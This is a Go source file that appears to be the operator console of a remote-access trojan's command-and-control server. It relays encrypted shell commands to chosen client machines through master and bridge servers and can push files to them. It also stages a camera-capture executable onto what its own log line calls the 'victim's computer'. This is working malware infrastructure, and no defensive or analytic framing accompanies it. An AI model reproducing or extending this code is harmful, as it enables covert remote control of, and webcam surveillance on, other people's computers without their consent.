package work

import (
	"encoding/base64"
	"fmt"
	"log"
	"net"
	"server-tcp-go/src/client"
	"server-tcp-go/src/config"
	"server-tcp-go/src/handler/message"
	"server-tcp-go/src/utils"
	"strings"
	"time"
)

func SendCommandToClient() bool {
	ListClient()

	fmt.Println("Choose client ip: ")
	clientIp, err := getInputString()
	if err != nil {
		fmt.Println("Invalid input: ", err)
		return true
	}

	ipClient := net.ParseIP(clientIp)
	if ipClient == nil {
		fmt.Println("============== Ip invalid ==============")
		return true
	}

	mess := message.NewMsg(
		message.MessageTypeCreateBridge,
		[]byte(clientIp),
		utils.GetLocalIP(),
	)

	messByte, err := mess.Encode()
	if err != nil {
		log.Println("Cannot encode mess create bridge")
		return true
	}

	MasterConnection.Write(messByte)
	fmt.Println("Send Create Bridge To Master success")

	cause := <-MasterCreateBridgeResp
	if cause == "group invalid" {
		fmt.Println("This server have no authority with this client")
		return true
	} else if cause == "Cannot connect to client" {
		log.Println(cause)
		return true
	} else if cause == "Invalid data create bridge" {
		log.Println(cause)
		return true
	} else if cause == "Time out" {
		log.Println(cause)
		return true
	}
	bridgeIp := cause

	BridgeConnection, err = net.Dial("tcp", bridgeIp+":"+config.GetBridgePort())
	if err != nil {
		log.Println("Cannot connect to bridge, err: ", err)
		return true
	}

	messByte = append(messByte, 0x00)
	BridgeConnection.Write(messByte)
	fmt.Println("Send Create Bridge To Bridge success")
	go listenToBridge(BridgeConnection)

	log.Println("Input command, type '0' to exit")
	for {
		fmt.Printf("[%s] >> ", clientIp)
		command, err := getInputString()
		if err != nil {
			log.Println("Invalid input command: ", err)
			continue
		}
		fmt.Printf("\n")
		if command == "0" {
			CloseSession()
			return true
		}
		if command == "" || command == "\n" {
			continue
		}
		if command == "marengo -help" {
			help()
			continue
		}

		key := string(clientKey)

		err = sendCommandToMiddle(bridgeIp, command, clientIp, key)
		if err != nil {
			log.Println("Error sending command to client:", err)
			continue
		}
	}
}

func sendCommandToMiddle(bridgeIp string, command string, clientIp string, key string) error {
	var err error
	if BridgeConnection == nil {
		BridgeConnection, err = net.Dial("tcp", bridgeIp+":"+config.GetBridgePort())
		if err != nil {
			log.Println("cannot connect to middle server: ", err)
			return err
		}
	}

	if strings.HasPrefix(command, "send file") {
		return sendFile(BridgeConnection, key, clientIp, command)
	}

	cmsg, err := client.NewClientMsg(client.CLIENT_MESSAGE_TYPE_COMMAND, []byte(command), 0)
	if err != nil {
		return fmt.Errorf("error creating client message %v", err)
	}
	byteData, _ := cmsg.SerializeClientMsg()

	encryptedCommand, err := utils.Encrypt([]byte(key), byteData)
	if err != nil {
		return fmt.Errorf("error encrypting command: %v", err)
	}

	encodedCommand := base64.StdEncoding.EncodeToString(encryptedCommand)

	msg := message.NewMsg(message.MessageTypeCommand, []byte(encodedCommand+"\n"+"-"+clientIp), utils.GetLocalIP())
	byteCommand, err := msg.Encode()

	if err != nil {
		return fmt.Errorf("error marshal command to client: %v", err)
	}
	byteCommand = append(byteCommand, 0x00)
	_, err = BridgeConnection.Write(byteCommand)
	if err != nil {
		return err
	}

	if strings.HasPrefix(command, "cameracapture") {
		go handleCaptureCamera(BridgeConnection, key, clientIp)
	}

	return nil
}

func handleCaptureCamera(conn net.Conn, key, addr string) {
	select {
	case res := <-BridgeCameraResp:
		if strings.HasPrefix(res, "[camera] no") {
			//fmt.Println("No camera found")
			log.Println("Staging camera func to client...")
			err := sendFile(conn, key, addr, "send file ./resources/camera.exe")
			if err != nil {
				log.Println("Cannot send file: ", err)
			}
		} else if strings.HasPrefix(res, "[camera] existed") {
			log.Println("Camera staging found on victim's computer!")
		}
	case <-time.After(5 * time.Second):
		log.Println("No response about camera, timeout")
	}
}

func SendCommandToClientWithKey() bool {
	log.Println("Choose client ip: ")
	clientIp, err := getInputString()
	if err != nil {
		log.Println("Invalid input: ", err)
		return true
	}

	log.Println("Input key: ")
	key, err := getInputString()
	if err != nil {
		log.Println("Invalid key: ", err)
		return true
	}

	mess := message.NewMsg(
		message.MessageTypeCreateBridge,
		nil,
		clientIp,
	)

	messByte, err := mess.Encode()
	if err != nil {
		log.Println("Cannot encode mess create bridge")
		return true
	}

	masterHost := config.GetMasterEndPoint()
	conn, err := net.Dial("tcp", masterHost)
	if err != nil {
		log.Println("Cannot connect to master host, err: ", err)
		return true
	}
	conn.Write(messByte)

	cause := <-MasterCreateBridgeResp
	if cause == "group invalid" {
		log.Println("This server have no authority with this client")
		return true
	}
	bridgeIp := cause

	log.Println("Input command, type '0' to exit")
	for {
		fmt.Printf("[%s] >> ", clientIp)
		command, err := getInputString()
		if err != nil {
			log.Println("Invalid input command: ", err)
			continue
		}
		fmt.Printf("\n")
		if command == "0" {
			CloseSession()
			return true
		}
		if command == "" || command == "\n" {
			continue
		}
		if command == "marengo -help" {
			help()
			continue
		}

		keyDecode, err := base64.StdEncoding.DecodeString(key)
		if err != nil {
			log.Println("error decoding output: ", err)
			return true
		}

		err = sendCommandToMiddle(bridgeIp, command, clientIp, string(keyDecode))
		if err != nil {
			log.Println("Error sending command to client:", err)
			continue
		}
		// if !isSuccess {
		// 	logging.Goodln("Successfully sent command, saved client and unique key")
		// 	clientInfo := ClientInfo{
		// 		address:          clientSelected,
		// 		key:              string(keyDecode),
		// 		middleServerAddr: conn.RemoteAddr().String(),
		// 	}
		// 	clientKeyMap[clientSelected] = clientInfo
		// 	connMap[clientSelected] = conn
		// 	isSuccess = true
		// }
	}
}
